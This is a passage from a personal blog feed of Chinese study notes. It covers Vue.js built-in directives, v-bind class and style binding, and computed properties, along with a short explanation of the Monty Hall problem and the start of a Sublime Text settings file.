      <link href="/categories/%E5%89%8D%E7%AB%AF/%E3%80%8AVue-js-%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/5-%E5%86%85%E7%BD%AE%E6%8C%87%E4%BB%A4/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/%E3%80%8AVue-js-%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/5-%E5%86%85%E7%BD%AE%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h4 id="5-1-基本指令"><a href="#5-1-基本指令" class="headerlink" title="5.1 基本指令"></a>5.1 基本指令</h4><ul><li><p><code>v-cloak</code></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">作用：解决网速较慢时，Vue.js文件还没加载完，在页面上会显示 未加载数据的状态(如&#123;&#123;message&#125;&#125;)</span><br><span class="line">使用：</span><br><span class="line"><span class="code">    (css)style -&gt; [v-cloak]&#123;display:none&#125; // none !important</span></span><br><span class="line"><span class="section">    &lt;div id=&quot;app&quot; v-cloak&gt;  ...  &lt;/div&gt;</span></span><br><span class="line"><span class="section">----</span></span><br><span class="line">简单的项目可以使用 v-cloak ，工程化项目使用 webpack 和 vue-router</span><br></pre></td></tr></table></figure></li><li><p><code>v-once</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">作用：定义它的元素或组件只渲染一次（包括子节点)。首次渲染后，不再随数据的变化重新渲染，将视为静态内容。</span><br><span class="line"></span><br></pre></td></tr></table></figure><span id="more"></span><h4 id="5-2-条件渲染指令"><a href="#5-2-条件渲染指令" class="headerlink" title="5.2 条件渲染指令"></a>5.2 条件渲染指令</h4><h5 id="5-2-1-v-if-v-else-if-v-else"><a href="#5-2-1-v-if-v-else-if-v-else" class="headerlink" title="5.2.1 v-if v-else-if v-else"></a>5.2.1 v-if v-else-if v-else</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v-if</span><br><span class="line">v-else-if</span><br><span class="line"><span class="section">v-else</span></span><br><span class="line"><span class="section">--------</span></span><br><span class="line">当有多个节点时 使用标签 template </span><br><span class="line"><span class="code">    template[v-if=&quot;&quot;]&gt;p&#123;some words&#125;*3</span></span><br><span class="line"><span class="code">--------</span></span><br><span class="line"><span class="code">Vue 会尽可能地复用已有的元素而非重新渲染，使用属性 key 使标签唯一，避免复用(文中 v-if ： input 的例子)</span></span><br></pre></td></tr></table></figure><h5 id="5-2-2-v-show"><a href="#5-2-2-v-show" class="headerlink" title="5.2.2 v-show"></a>5.2.2 v-show</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">v-show</span> 为<span class="selector-tag">flase</span>元素会隐藏(通过改变元素的CSS属性<span class="attribute">display</span>:none)</span><br></pre></td></tr></table></figure><h5 id="5-2-3-v-if-与-v-show-选择"><a href="#5-2-3-v-if-与-v-show-选择" class="headerlink" title="5.2.3 v-if 与 v-show 选择"></a>5.2.3 v-if 与 v-show 选择</h5></li><li><p>区别</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v-<span class="keyword">if</span>:初始值为<span class="literal">false</span>时不渲染，值改变时会销毁或重建元素及绑定的事件或子组件；能在<span class="keyword">template</span>上使用</span><br><span class="line">v-show:渲染，通过改变display显示<span class="keyword">or</span>隐藏；不能在<span class="keyword">template</span>使用</span><br></pre></td></tr></table></figure></li><li><p>选择</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">v-if:切换开销较大，更适合条件不经常改变的场景</span></span><br><span class="line"><span class="section">v-show:适用于频繁切换条件场景</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="5-3-列表渲染指令"><a href="#5-3-列表渲染指令" class="headerlink" title="5.3 列表渲染指令"></a>5.3 列表渲染指令</h4><h5 id="5-3-1-基本用法"><a href="#5-3-1-基本用法" class="headerlink" title="5.3.1 基本用法"></a>5.3.1 基本用法</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v-for=&quot;book in books&quot;</span><br><span class="line">v-for=&quot;(book index) in books&quot;</span><br><span class="line"><span class="section">v-for=&quot;(value,key,index) in user&quot;</span></span><br><span class="line"><span class="section">-----------------</span></span><br><span class="line">v-for: value</span><br><span class="line">v-for: value,index ===&gt; array</span><br><span class="line"><span class="section">v-for: value,key,index ===&gt; dict</span></span><br><span class="line"><span class="section">-------</span></span><br><span class="line">in 或者 of 都可以</span><br></pre></td></tr></table></figure><h5 id="5-3-2-数组更新方法"><a href="#5-3-2-数组更新方法" class="headerlink" title="5.3.2 数组更新方法"></a>5.3.2 数组更新方法</h5><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(会改变原有数组）</span><br><span class="line">push()   增加</span><br><span class="line">pop()    删除</span><br><span class="line">shift()  </span><br><span class="line">unshift()</span><br><span class="line">splice()    拼接</span><br><span class="line">sort()      排序</span><br><span class="line">reverse()   逆序</span><br><span class="line">----------</span><br><span class="line">(不会改变原有数组,而是返回一个新数组)</span><br><span class="line">filter()</span><br><span class="line">    app.books=app.books.filter(<span class="name">function</span>(<span class="name">item</span>))&#123;</span><br><span class="line">        return item.name.match(<span class="name">/JavaScript/</span>)<span class="comment">;</span></span><br><span class="line">    &#125;)<span class="comment">;</span></span><br><span class="line">concat()</span><br><span class="line">slice()</span><br></pre></td></tr></table></figure><p>Vue在检测到数组变化时，不会直接重新渲染整个列表，而是最大化的复用DOM元素。<br>但在以下情况，Vue不能检测到，也不会触发视图更新：</p><ul><li>通过索引直接设置项(例：<code>app.books[3]=&#123;...&#125;</code>)<ul><li>使用Vue内置的<code>set</code>方法设置项(<code>webpack</code>&gt;$set`)  <figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Vue.<span class="keyword">set</span>(app.books,<span class="number">3</span>,&#123;</span><br><span class="line">    name:<span class="string">&#x27;《CSS揭秘》&#x27;</span>,</span><br><span class="line">    author:<span class="string">&#x27;[希]Lea Verou&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line">--------------------</span><br><span class="line"><span class="keyword">this</span>.$<span class="keyword">set</span>(app.books,<span class="number">3</span>,&#123;</span><br><span class="line">    name:<span class="string">&#x27;《CSS揭秘》&#x27;</span>,</span><br><span class="line">    autohor:<span class="string">&#x27;[希] Lea Verou&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">这里的<span class="keyword">this</span>指向当前组件实例，即app</span><br><span class="line">在非webpack模式下也可以使用$<span class="keyword">set</span>方法，例如app.$<span class="keyword">set</span>(...)</span><br></pre></td></tr></table></figure></li><li>使用<code>splice</code>  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app<span class="selector-class">.books</span><span class="selector-class">.splice</span>(<span class="number">3</span>,<span class="number">1</span>,&#123;</span><br><span class="line">    name:<span class="string">&#x27;《CSS揭秘》&#x27;</span>,</span><br><span class="line">    author:<span class="string">&#x27;[希] Lea Verou&#x27;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul></li><li>修改数组长度(例：<code>app.books.length=1 </code>)<ul><li>使用<code>splice</code><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.books.splice(<span class="number">1</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h5 id="5-3-3-过滤与排序"><a href="#5-3-3-过滤与排序" class="headerlink" title="5.3.3 过滤与排序"></a>5.3.3 过滤与排序</h5>使用计算属性返回过滤或排序后的数组<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">data:&#123;</span><br><span class="line">    books:[]</span><br><span class="line">&#125;</span><br><span class="line">computed:&#123;</span><br><span class="line">    filterBooks:function()&#123;</span><br><span class="line"><span class="built_in">        return</span> this.books.filter(function(book)&#123;</span><br><span class="line"><span class="built_in">            return</span> book.<span class="built_in">name</span>.match(/JavaScript/);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    sortedBooks:function()&#123;</span><br><span class="line"><span class="built_in">        return</span> this.books.sort(function(book1,book2)&#123;</span><br><span class="line"><span class="built_in">            return</span> book1.<span class="built_in">name</span>.<span class="built_in">length</span>&lt;book2.<span class="built_in">name</span>.<span class="built_in">length</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    /*<span class="comment">----------------</span></span><br><span class="line">    !!sorttedBooks有个错误：sort 函数的返回值不能是 ture 或者 <span class="literal">false</span>，而是依据返回值的正负零来判断</span><br><span class="line">    所以：</span><br><span class="line"><span class="built_in">        return</span> book2.<span class="built_in">name</span>.<span class="built_in">length</span>-book1.<span class="built_in">name</span>.<span class="built_in">length</span>;</span><br><span class="line">    这样，当 book2.<span class="built_in">name</span>.<span class="built_in">length</span> &gt; book1.<span class="built_in">name</span>.<span class="built_in">length</span>时 ，交换位置</span><br><span class="line">    即，书名长度从长到短</span><br><span class="line">    */</span><br><span class="line">&#125;</span><br><span class="line">filter 不改变原有数组，sort 改变了原有数组。</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="5-4-事件与方法"><a href="#5-4-事件与方法" class="headerlink" title="5.4 事件与方法"></a>5.4 事件与方法</h4><h5 id="5-4-1-用法"><a href="#5-4-1-用法" class="headerlink" title="5.4.1 用法"></a>5.4.1 用法</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@click:</span><span class="string">&quot;method_name()&quot;</span></span><br><span class="line">-------</span><br><span class="line"><span class="number">1</span>. 如果方法没有参数，可以不写括号</span><br><span class="line"><span class="number">2</span>. 如果方法有参数，默认会将原生事件event传入</span><br><span class="line"><span class="number">3</span>. 特殊变量 $event , 用于访问原生DOM事件</span><br><span class="line"><span class="number">4</span>. 根据<span class="number">2</span>、<span class="number">3</span> , <span class="variable">@click</span>=<span class="string">&quot;method_name&quot;</span> =&gt; <span class="variable">@click</span>=<span class="string">&quot;method_name()&quot;</span> =&gt;  <span class="variable">@click</span>=<span class="string">&quot;method_name(&quot;</span>$event&quot;) </span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="5-4-2-修饰符"><a href="#5-4-2-修饰符" class="headerlink" title="5.4.2 修饰符"></a>5.4.2 修饰符</h5><ul><li>事件修饰符<ul><li><code>.stop</code></li><li><code>prevent</code></li><li><code>.capture</code></li><li><code>.self</code></li><li><code>.once</code><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//阻止单击事件冒泡</span><br><span class="line">a[@click.stop=<span class="string">&quot;handle&quot;</span>]</span><br><span class="line">//提交事件不再重载页面</span><br><span class="line">form[@submit.prevent=<span class="string">&quot;handle&quot;</span>]</span><br><span class="line">//添加事件侦听器使用事件捕获模式</span><br><span class="line"><span class="keyword">div</span>[@click.capture=<span class="string">&quot;handle&quot;</span>]<span class="meta">&#123;...&#125;</span></span><br><span class="line">//只当事件在改元素本身(而不是子元素)触发时触发回调</span><br><span class="line"><span class="keyword">div</span>[@click.self=<span class="string">&quot;handle&quot;</span>]<span class="meta">&#123;...&#125;</span></span><br><span class="line">//只触发一次，组件同样适用</span><br><span class="line"><span class="keyword">div</span>[@click.once=<span class="string">&quot;handle&quot;</span>]</span><br><span class="line"></span><br><span class="line">//修饰符可以组合使用</span><br><span class="line">a[@click.stop.prevent=<span class="string">&quot;handle&quot;</span>]</span><br><span class="line">//只有修饰符</span><br><span class="line">form[@submit.prevent]</span><br></pre></td></tr></table></figure></li></ul></li><li>按键修饰符<ul><li>键盘按键<ul><li><code>keyCode</code> (一个数字)</li><li>快捷<ul><li><code>.enter</code></li><li><code>.tab</code></li><li><code>.delete</code> (删除 和 退格 键)</li><li><code>.esc</code></li><li><code>.space</code></li><li><code>.up</code></li><li><code>.down</code></li><li><code>.left</code></li><li><code>.right</code></li></ul></li></ul></li><li>鼠标快捷<ul><li><code>.ctrl</code></li><li><code>.alt</code></li><li><code>.shift</code></li><li><code>.meta</code> (Mac-&gt;Command,Windows-&gt;窗口)<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shift + S</span></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[@keyup.shift.83=<span class="string">&quot;handleSave&quot;</span>]</span></span><br><span class="line"><span class="comment">// Ctrl + Click</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-attr">[@click.ctrl=<span class="string">&quot;doSomething&quot;</span>]</span>&#123;<span class="selector-tag">Do</span> <span class="selector-tag">something</span>&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h4 id="5-5-实战：计算属性、指令等知识开发购物车"><a href="#5-5-实战：计算属性、指令等知识开发购物车" class="headerlink" title="5.5 实战：计算属性、指令等知识开发购物车"></a>5.5 实战：计算属性、指令等知识开发购物车</h4>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 《Vue.js 实战》笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>收藏：蒙特霍问题</title>
      <link href="/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/%E6%94%B6%E8%97%8F/%E6%94%B6%E8%97%8F%EF%BC%9A%E8%92%99%E7%89%B9%E9%9C%8D%E9%97%AE%E9%A2%98/"/>
      <url>/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/%E6%94%B6%E8%97%8F/%E6%94%B6%E8%97%8F%EF%BC%9A%E8%92%99%E7%89%B9%E9%9C%8D%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>一个反直觉的概率题  蒙特霍问题或三门问题Monty Hool problem  </p><p>自己举一个例子，你做选择题，三个选项，你选了c,然后老师和你说，b是错的，你改不改答案。</p><p>应用，计算一下四个选项时候的概率</p><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g47q397q5fj30fq08faan.jpg" alt=""><h4 id="维基百科："><a href="#维基百科：" class="headerlink" title="维基百科："></a>维基百科：</h4><p>有三种可能的情况，全部都有相等的可能性（1/3）：</p><ul><li><p>参赛者挑汽车，主持人挑两头羊的任何一头。转换将失败。</p></li><li><p>参赛者挑A羊，主持人挑B羊。转换将赢得汽车。</p></li><li><p>参赛者挑B羊，主持人挑A羊。转换将赢得汽车。</p><span id="more"></span><p>@问题是：关于第一种可能性的表述可以分成两种可能吗？</p></li><li><p>参赛者挑汽车，主持人挑A羊。转换将失败。</p></li><li><p>参赛者挑汽车，主持人挑B羊。转换将失败。</p></li></ul><p>在后两种情况，参赛者可以透过转换选择而赢得汽车。第一种情况是唯一一种参赛者透过保持原来选择而赢的情况。因为三种情况中有两种是透过转换选择而赢的，所以透过转换选择而赢的概率是2/3。</p><p>如果没有最初选择，或者如果主持人随便打开一扇门（可能主持人会直接开到汽车门，导致游戏结束），又或者如果主持人只会在参赛者作出特定选择某一门时才会问是否转换选择的话，问题都将会变得不一样。例如，如果主持人先从两只山羊中剔除其中一只，然后才叫参赛者作出选择的话，选中的机会将会是1/2。</p><p>还可以用逆向思维的方式来理解这个选择。无论参赛者开始的选择如何，在被主持人问到是否更换时都选择更换。如果参赛者先选中山羊，换之后百分之百赢；如果参赛者先选中汽车，换之后百分之百输。而选中山羊的概率是2/3，选中汽车的概率是1/3。所以不管怎样都换，相对最初的赢得汽车仅为1/3的机率来说，转换选择可以增加赢的机会。</p><p>一些更简洁的解法：（1）你最初选羊的几率是2/3，而主持人选羊以后，你转换后再选羊的几率就是你最初选车的几率，1/3。 （2）或者反过来看：你最初选车的几率为1/3，主持人选羊以后，你转换后选车的几率就是你最初选羊的几率，2/3。 （3）你最初选车的几率为1/3，车在另外两个门后的几率为2/3，主持人选羊以后，车在最后那张门后的几率还是原来两张门后有车的几率，2/3。</p><p>三门问题是多门问题里最难的情况。如果把三门变成千门，参赛者第一次就选中的概率就是1/1000，参赛者就会清楚自己是在猜，而不是如同三门的时候1/3的概率认为自己是对的。这样，当主持人打开剩下999扇门中的998扇时，该如何选择，认真思考就会比三门的时候清晰很多。</p>]]></content>
      
      
      <categories>
          
          <category> 有道云笔记-搬 </category>
          
          <category> 收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反直觉问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.v-bind 及 class 与 style 绑定</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/%E3%80%8AVue-js-%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/4-v-bind-%E5%8F%8A-class-%E4%B8%8E-style-%E7%BB%91%E5%AE%9A/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/%E3%80%8AVue-js-%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/4-v-bind-%E5%8F%8A-class-%E4%B8%8E-style-%E7%BB%91%E5%AE%9A/</url>
      
        <content type="html"><![CDATA[<h4 id="4-1-了解-v-bind-指令"><a href="#4-1-了解-v-bind-指令" class="headerlink" title="4.1 了解 v-bind 指令"></a>4.1 了解 <code>v-bind</code> 指令</h4><p><code>v-bind</code>：动态更新<code>HTML</code>元素上的<strong>属性</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">之前的示例：</span><br><span class="line"><span class="code">    v-vind:href=&quot;url&quot;  </span></span><br><span class="line"><span class="code">    v-bind:src=&quot;imgUrl&quot; </span></span><br><span class="line"><span class="section">--&gt;   data:&#123;url:&#x27;   &#x27;, imgUrl:&#x27;  &#x27;&#125;</span></span><br><span class="line"><span class="section">----------------</span></span><br><span class="line"><span class="code">    当数据变化时（如：href,src,class,style），就会重新渲染</span></span><br></pre></td></tr></table></figure><h4 id="4-2-绑定class的几种方式"><a href="#4-2-绑定class的几种方式" class="headerlink" title="4.2 绑定class的几种方式"></a>4.2 绑定<code>class</code>的几种方式</h4><ul><li><p>动态切换  <code>:class=&#123;&#39;class1&#39;:true/false,&#39;class2&#39;:true/false...&#125;</code><span id="more"></span></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">div#app</span><br><span class="line"><span class="code">    &lt;div v-bind:class=&quot;&#123;&#x27;active&#x27;:isActive,&#x27;error&#x27;:isError&#125;&quot;&gt;&lt;/div&gt;</span></span><br><span class="line">script-&gt;new Vue()</span><br><span class="line"><span class="code">    data:&#123;</span></span><br><span class="line"><span class="code">        isActive:true,</span></span><br><span class="line"><span class="code">        isError:false</span></span><br><span class="line"><span class="section">    &#125;</span></span><br><span class="line"><span class="section">---</span></span><br><span class="line"><span class="code">    动态的切换class，为true则加载。表达式复杂时还可使用计算属性(或 methods)。</span></span><br></pre></td></tr></table></figure></li><li><p>数组语法 <code>:class=&quot;[varCalssName1,varClassName2,...]&quot;</code></p></li><li><p>数组语法中使用对象语法</p></li><li><p>在组件上使用</p></li></ul><h4 id="4-3-绑定内联样式"><a href="#4-3-绑定内联样式" class="headerlink" title="4.3 绑定内联样式"></a>4.3 绑定内联样式</h4><ul><li>对象语法 <figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">div</span> -&gt;</span> :style=<span class="string">&quot;&#123;&#x27;color&#x27;:color,&#x27;fontSize&#x27;:fontSize+&#x27;px&#x27;&#125;&quot;</span></span><br><span class="line"><span class="function"><span class="title">data</span> -&gt;</span> <span class="built_in">color</span>:<span class="string">&#x27;red&#x27;</span>,fontSize:<span class="number">14</span></span><br></pre></td></tr></table></figure></li><li>样式写在 <code>data</code> 或 <code>computed</code>里<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">div</span> -&gt;</span> :style=<span class="string">&quot;styles&quot;</span></span><br><span class="line"><span class="function"><span class="title">data</span> -&gt;</span> styles:&#123;<span class="built_in">color</span>:<span class="string">&#x27;red&#x27;</span>,fontSize:<span class="number">14</span>+<span class="string">&#x27;px&#x27;</span>&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 《Vue.js 实战》笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3.计算属性</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/%E3%80%8AVue-js-%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/3-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/%E3%80%8AVue-js-%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/3-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h4 id="3-1-什么是计算属性"><a href="#3-1-什么是计算属性" class="headerlink" title="3.1 什么是计算属性"></a>3.1 什么是计算属性</h4><p>当表达式过长时，可以使用计算属性。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">表达式 改 计算属性</span></span><br><span class="line"><span class="section">---</span></span><br><span class="line">div</span><br><span class="line"><span class="code">    &#123;&#123;text.split(&#x27;,&#x27;).reverse().join(&#x27;,&#x27;)&#125;</span></span><br><span class="line">==&gt; 使用 计算属性</span><br><span class="line">div</span><br><span class="line"><span class="code">    &#123;&#123;reversedText&#125;&#125;</span></span><br><span class="line">script --&gt; new Vue() </span><br><span class="line"><span class="code">    data:&#123;</span></span><br><span class="line"><span class="code">        text:&#x27;123.456&#x27;</span></span><br><span class="line"><span class="code">    &#125;,</span></span><br><span class="line"><span class="code">    computed:&#123;</span></span><br><span class="line"><span class="code">        reversedText:function()&#123;</span></span><br><span class="line"><span class="code">            //this 指向的是当前实例</span></span><br><span class="line"><span class="code">            return this.text.split(&#x27;,&#x27;).reverse().join(&#x27;,&#x27;);</span></span><br><span class="line"><span class="code">        &#125;</span></span><br><span class="line"><span class="section">    &#125;</span></span><br><span class="line"><span class="section">------------</span></span><br><span class="line">1.需要在 模版写入计算属性的方法名 &#123;&#123;f_com&#125;&#125;，需要有返回值</span><br><span class="line">2.computed 中 在相应的方法中处理并返回数据</span><br></pre></td></tr></table></figure><span id="more"></span><h4 id="3-2-用法"><a href="#3-2-用法" class="headerlink" title="3.2 用法"></a>3.2 用法</h4><p>依赖一个或 <strong>多个</strong> Vue实例的数据，经过复杂的处理(<strong>运算，函数调用等</strong>)，最终返回<strong>一个结果</strong>。只要任一数据发生<strong>变化</strong>，计算属性就会<strong>重新执行</strong>，视图也会<strong>更新</strong>。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">代码文件：</span><br><span class="line">    <span class="number">3.1</span>：商品价格计算.html</span><br><span class="line">        可更改橘子个数，价格也实时改变。</span><br><span class="line">    <span class="number">3.2</span>: getter与setter.html  </span><br><span class="line">        computed:&#123;fullname:&#123;<span class="keyword">get</span>:<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> &#125;,<span class="keyword">set</span>:<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;&#125; &#125;&#125;</span><br><span class="line">        默认是getter方法，setter很少用</span><br></pre></td></tr></table></figure><p>还可以做：动态设置元素的样式名称<code>class</code>和内联样式<code>style</code>。</p><h4 id="3-3-计算属性缓存"><a href="#3-3-计算属性缓存" class="headerlink" title="3.3 计算属性缓存"></a>3.3 计算属性缓存</h4><p><code>methods</code> 与 <code>computed</code> 的区别：</p><ul><li><code>methods</code>可以接受参数;<code>computed</code>不行</li><li><code>computed</code> 是基于它的依赖缓存的(即只有当它所依赖的数据发生变化时，才会重新取值。) ; <code>methods</code>是页面被重新渲染时才调用函数</li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li>怎么用：    computed:{} </li><li>何时用（与<code>methods</code>的区别）：需要依赖缓存时</li><li>实例：计算商品价格，get与set(默认get)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 《Vue.js 实战》笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sublime 配置</title>
      <link href="/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/%E9%85%8D%E7%BD%AE/sublime%E9%85%8D%E7%BD%AE/sublime-%E9%85%8D%E7%BD%AE/"/>
      <url>/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/%E9%85%8D%E7%BD%AE/sublime%E9%85%8D%E7%BD%AE/sublime-%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h4 id="sublime-首选项-设置"><a href="#sublime-首选项-设置" class="headerlink" title="sublime 首选项-设置"></a>sublime 首选项-设置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&quot;color_scheme&quot;: &quot;Packages/User/SublimeLinter/Monokai (SL).tmTheme&quot;,</span><br><span class="line">&quot;dictionary&quot;: &quot;Packages/Language - English/en_US.dic&quot;,</span><br><span class="line">&quot;expand_tabs_on_save&quot;: false,</span><br><span class="line">&quot;font _size&quot;: 12,</span><br><span class="line">&quot;ignored_packages&quot;:</span><br><span class="line">[</span><br><span class="line">&quot;Vintage&quot;</span><br><span class="line">],</span><br><span class="line">&quot;tab_size&quot;: 4,</span><br><span 